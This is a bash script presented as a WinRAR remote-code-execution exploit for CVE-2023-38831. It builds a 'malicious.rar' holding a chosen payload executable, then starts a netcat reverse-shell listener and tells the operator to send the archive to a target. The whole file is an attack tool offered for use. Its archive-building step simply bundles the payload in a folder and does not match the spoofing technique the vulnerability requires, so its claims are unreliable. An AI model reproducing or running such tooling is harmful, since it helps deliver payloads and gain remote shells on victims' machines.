#!/bin/bash
# CVE-2023-38831 - WinRAR Remote Code Execution Vulnerability
# Description: Detects and exploits WinRAR vulnerability (CVE-2023-38831) that allows remote code execution via a crafted archive
# Author: Sn1per
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2023-38831
# Version: 1.0

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Default values
TARGET=""
PAYLOAD=""
OUTPUT="malicious.rar"
LISTEN_PORT=4444

# Print banner
print_banner() {
    echo -e "${YELLOW}"
    echo "  __        ___    _   _  ____  _   _ _____ ____  "
    echo "  \ \      / / \  | \ | |/ ___|| \ | | ____|  _ \ "
    echo "   \ \ /\ / / _ \ |  \| | |    |  \| |  _| | |_) |"
    echo "    \ V  V / ___ \| |\  | |___ | |\  | |___|  _ < "
    echo "     \_/\_/_/   \_\_| \_|\____||_| \_|_____|_| \_\"
    echo -e "\n  WinRAR RCE Exploit (CVE-2023-38831) - Sn1per${NC}\n"
}

# Print usage
usage() {
    echo "Usage: $0 -t <target> -p <payload> [-o output.rar] [-l port]"
    echo "Options:"
    echo "  -t <target>     Target IP or hostname"
    echo "  -p <payload>    Path to payload executable"
    echo "  -o <output>     Output RAR file (default: malicious.rar)"
    echo "  -l <port>       Port for reverse shell (default: 4444)"
    echo "  -h              Show this help message"
    exit 1
}

# Check if required tools are installed
check_tools() {
    local missing=0
    for tool in rar curl nc; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RED}[!] Error: $tool is not installed${NC}"
            missing=1
        fi
    done
    
    if [ $missing -ne 0 ]; then
        echo -e "${YELLOW}[*] Please install the missing tools and try again.${NC}"
        exit 1
    fi
}

# Generate malicious RAR file
generate_rar() {
    echo -e "${YELLOW}[*] Creating malicious RAR file...${NC}"
    
    # Create a temporary directory
    TMP_DIR=$(mktemp -d)
    
    # Create the malicious structure
    mkdir -p "${TMP_DIR}/exploit/"
    cp "$PAYLOAD" "${TMP_DIR}/exploit/"
    
    # Create the malicious archive
    (cd "${TMP_DIR}" && rar a -r -ep1 -inul "$OUTPUT" .)
    
    # Clean up
    rm -rf "${TMP_DIR}"
    
    if [ -f "$OUTPUT" ]; then
        echo -e "${GREEN}[+] Malicious RAR file created: $OUTPUT${NC}"
    else
        echo -e "${RED}[!] Failed to create RAR file${NC}"
        exit 1
    fi
}

# Start listener
start_listener() {
    echo -e "${YELLOW}[*] Starting listener on port $LISTEN_PORT...${NC}"
    echo -e "${YELLOW}[*] Send the RAR file to the target and wait for connection...${NC}"
    nc -lvnp $LISTEN_PORT
}

# Main function
main() {
    print_banner
    
    # Check for root
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${YELLOW}[*] Some operations might require root privileges${NC}"
    fi
    
    # Check for required tools
    check_tools
    
    # Parse command line arguments
    while getopts "t:p:o:l:h" opt; do
        case $opt in
            t) TARGET="$OPTARG" ;;
            p) PAYLOAD="$OPTARG" ;;
            o) OUTPUT="$OPTARG" ;;
            l) LISTEN_PORT="$OPTARG" ;;
            h) usage ;;
            *) usage ;;
        esac
    done
    
    # Validate parameters
    if [ -z "$TARGET" ] || [ -z "$PAYLOAD" ]; then
        echo -e "${RED}[!] Error: Target and payload are required${NC}"
        usage
    fi
    
    if [ ! -f "$PAYLOAD" ]; then
        echo -e "${RED}[!] Error: Payload file not found: $PAYLOAD${NC}"
        exit 1
    fi
    
    # Generate the malicious RAR
    generate_rar
    
    # Start listener if target is localhost/127.0.0.1
    if [[ "$TARGET" == "127.0.0.1" || "$TARGET" == "localhost" ]]; then
        start_listener
    else
        echo -e "${GREEN}[+] Malicious RAR file created: $OUTPUT"
        echo -e "${YELLOW}[*] Send this file to the target and start a listener manually:${NC}"
        echo -e "    nc -lvnp $LISTEN_PORT"
    fi
}

# Execute main function
main "$@"

exit 0
